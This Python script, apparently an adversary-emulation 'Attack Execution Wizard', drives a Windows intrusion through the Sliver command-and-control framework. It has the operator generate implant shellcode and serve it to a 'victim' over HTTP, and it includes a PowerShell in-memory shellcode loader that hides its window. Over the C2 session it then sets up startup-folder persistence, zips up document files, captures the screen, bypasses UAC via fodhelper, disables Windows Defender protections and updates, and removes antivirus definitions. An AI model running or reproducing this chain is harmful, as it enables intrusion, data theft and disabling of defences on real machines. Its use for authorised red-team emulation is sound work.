
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell and execute these scripts)

        $s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
        $c='using System;using System.Runtime.InteropServices;public class W{[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
        $p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
        [System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
        $h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: whoami[/]")
    confirm_action()
    try:
        await sliver_executor.whoami(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 9 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: new_startup_folder[/]")
    console.print(f"  Description: new startup folder to replace standard one")
    default_val = r"$env:TMP\atomictest"
    user_input = console.input(
        f"[bold]➤ Enter value for new_startup_folder [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: new_startup_folder")
    user_params["new_startup_folder"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 9 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: payload[/]")
    console.print(f"  Description: executable to be placed in new startup location ")
    default_val = r"C:\Windows\System32\calc.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for payload [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: payload")
    user_params["payload"] = user_input
    commands = rf"""
    New-Item -ItemType Directory -path "{user_params["new_startup_folder"]}"
    Copy-Item -path "{user_params["payload"]}" -destination "{user_params["new_startup_folder"]}"
    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "{user_params["new_startup_folder"]}"

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 11 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
    console.print(f"  Description: Path to directory for saving the generated zip file")
    default_val = r"PathToAtomicsFolder\..\ExternalPayloads\T1005"
    user_input = console.input(
        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_zip_folder_path")
    user_params["output_zip_folder_path"] = user_input
    commands = """
    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 12 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = r""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Location to save zipped file or folder")
    default_val = r"None"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: input_file[/]")
    console.print(f"  Description: Location of file or folder to zip")
    default_val = r"None"
    user_input = console.input(
        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: input_file")
    user_params["input_file"] = user_input
    commands = rf"""
    Compress-Archive -Path "{user_params["input_file"]}" -DestinationPath {user_params["output_file"]} -Force

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Output file path")
    default_val = r"c:\temp\T1113_desktop.zip"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    cmd /c start /b psr.exe /start /output {user_params["output_file"]} /sc 1 /gui 0 /stopevent 12
    Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
    [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
    cmd /c "timeout 5 > NULL && psr.exe /stop"

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 16 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
    console.print(f"  Description: Binary to execute with UAC Bypass")
    default_val = "C:\Windows\System32\cmd.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: executable_binary")
    user_params["executable_binary"] = user_input
    commands = f"""
    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{user_params["executable_binary"]}" /f
    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
    fodhelper.exe
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()
    commands = """
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul 
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\software\microsoft\windows defender\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Microsoft\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    bcdedit /set safeboot network
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = f"""
    reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
